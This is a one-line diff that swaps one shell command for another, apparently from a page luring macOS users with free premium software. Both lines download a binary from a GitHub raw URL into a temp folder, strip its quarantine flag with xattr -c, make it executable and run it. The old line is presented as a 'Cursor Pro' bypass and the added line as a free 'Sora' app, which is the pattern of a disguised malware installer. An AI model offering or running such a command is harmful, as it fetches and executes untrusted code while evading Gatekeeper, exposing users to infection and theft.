@@ -1,1 +1,1 @@
-cd $TMPDIR && curl -O https://raw.githubusercontent.com/cursor-pro-bypass/cursor-pro-free/main/cursorvip && xattr -c cursorvip  && chmod +x cursorvip  && ./cursorvip
+cd $TMPDIR && curl -O https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/sorafree && xattr -c sorafree  && chmod +x sorafree  && ./sorafree
